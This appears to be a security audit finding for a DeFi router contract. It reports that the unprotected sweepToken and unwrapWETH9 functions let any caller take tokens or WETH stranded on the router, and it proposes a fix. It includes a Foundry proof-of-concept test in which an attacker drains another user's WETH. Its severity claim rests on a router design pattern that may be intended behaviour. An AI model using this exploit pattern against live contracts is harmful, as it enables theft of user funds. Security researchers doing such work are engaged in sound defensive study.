### Title
Unprotected `sweepToken` and `unwrapWETH9` Allow Any Caller to Steal Router-Held Tokens and WETH — (File: `metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`sweepToken` and `unwrapWETH9` in `PeripheryPayments.sol` are `public payable` with no access control and accept a fully caller-specified `recipient`. Any unprivileged caller can drain the entire router balance of any ERC-20 token or WETH to an arbitrary address, stealing funds that are economically attributable to a different user's earlier router step.

---

### Finding Description

Both helpers sweep the **entire** contract balance unconditionally:

```solidity
// PeripheryPayments.sol L48-55
function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);
    if (balanceToken > 0) {
        IERC20(token).safeTransfer(recipient, balanceToken);
    }
}

// PeripheryPayments.sol L37-45
function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(recipient, balanceWETH);
    }
}
```

Neither function checks `msg.sender` against any expected caller, nor validates that `recipient` is the address that deposited the funds. The `amountMinimum` parameter is caller-controlled and can be set to `0`, so the check provides no protection.

The standard usage pattern for a WETH-output swap is:

```
multicall([
    exactInputSingle(tokenIn=USDC, tokenOut=WETH, recipient=address(router), ...),
    unwrapWETH9(minAmount, alice)
])
```

WETH is intentionally routed to the router between these two steps. If Alice sends these as two separate transactions (front-end bug, manual interaction, or any non-atomic flow), the WETH is stranded on the router between them. An attacker observing the first transaction in the mempool can immediately call `unwrapWETH9(0, attacker)` after it confirms, draining Alice's WETH before her second transaction executes.

The same applies to `sweepToken` for any ERC-20 output token routed through `address(router)` as an intermediate recipient.

Additionally, the `pay` function deposits only the required portion of `msg.value` as WETH:

```solidity
// PeripheryPayments.sol L74-77
uint256 nativeBalance = address(this).balance;
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);
}
```

If `nativeBalance > value`, the surplus ETH remains on the router. Any caller can then invoke `refundETH()` (which sends to `msg.sender`) and claim the surplus that belongs to the original depositor.

---

### Impact Explanation

Direct loss of user principal. Any tokens or WETH stranded on the router — through the standard two-step swap-then-unwrap pattern executed non-atomically — are immediately claimable by any unprivileged caller who specifies themselves as `recipient`. The stolen amount equals the full router balance of the targeted token at the time of the call, which can be arbitrarily large depending on the victim's swap size.

---

### Likelihood Explanation

Medium. The attack requires tokens to be stranded on the router first, which occurs when:

1. A user or front-end sends a swap with `recipient=address(router)` and the subsequent `sweepToken`/`unwrapWETH9` call in a separate transaction rather than the same multicall.
2. A user sends excess `msg.value` for a WETH swap without including `refundETH()` in the multicall.
3. Any integration that constructs two-step router flows non-atomically.

Front-end bugs and manual interactions make scenario 1 realistic. The attack itself requires no special privileges and is trivially executable by any on-chain observer.

---

### Recommendation

Add caller attribution to `sweepToken` and `unwrapWETH9`. The simplest fix is to require `recipient == msg.sender`, matching the behavior of `refundETH`:

```solidity
function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    require(recipient == msg.sender, "recipient must be caller");
    ...
}

function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    require(recipient == msg.sender, "recipient must be caller");
    ...
}
```

Alternatively, track per-user deposited balances in transient storage and only allow each caller to sweep their own attributed share.

---

### Proof of Concept

```solidity
// Step 1: Alice swaps USDC → WETH, routing output to the router (standard pattern)
vm.prank(alice);
router.exactInputSingle(IMetricOmmSimpleRouter.ExactInputSingleParams({
    pool: address(pool),
    tokenIn: address(usdc),
    tokenOut: address(weth),
    zeroForOne: true,
    amountIn: 1_000e6,
    amountOutMinimum: 0,
    recipient: address(router),   // <-- WETH lands on router
    deadline: block.timestamp + 1,
    priceLimitX64: 0,
    extensionData: ""
}));

uint256 routerWeth = weth.balanceOf(address(router));
assertGt(routerWeth, 0, "WETH stranded on router");

// Step 2: Bob (unrelated attacker) drains Alice's WETH before she can unwrap it
uint256 bobEthBefore = bob.balance;
vm.prank(bob);
router.unwrapWETH9(0, bob);   // amountMinimum=0, recipient=bob — no revert

// Step 3: Bob received Alice's ETH; router is empty; Alice gets nothing
assertEq(bob.balance - bobEthBefore, routerWeth, "Bob stole Alice's ETH");
assertEq(weth.balanceOf(address(router)), 0, "router drained");

// Step 4: Alice's follow-up unwrap now reverts with InsufficientWETH
vm.prank(alice);
vm.expectRevert();
router.unwrapWETH9(1, alice);
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L37-55)
```text
  function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);

    if (balanceWETH > 0) {
      IWETH9(WETH).withdraw(balanceWETH);
      _transferETH(recipient, balanceWETH);
    }
  }

  /// @inheritdoc IPeripheryPayments
  function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);

    if (balanceToken > 0) {
      IERC20(token).safeTransfer(recipient, balanceToken);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L57-63)
```text
  /// @inheritdoc IPeripheryPayments
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L103-112)
```text
      _setNextCallbackContext(pool, CALLBACK_MODE_JUST_PAY, i == 0 ? msg.sender : address(this), params.tokens[i]);
      (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(pool)
        .swap(
          i == last ? params.recipient : address(this),
          zeroForOne,
          amount,
          MetricOmmSwapPath.openLimit(zeroForOne),
          "",
          params.extensionDatas[i]
        );
```
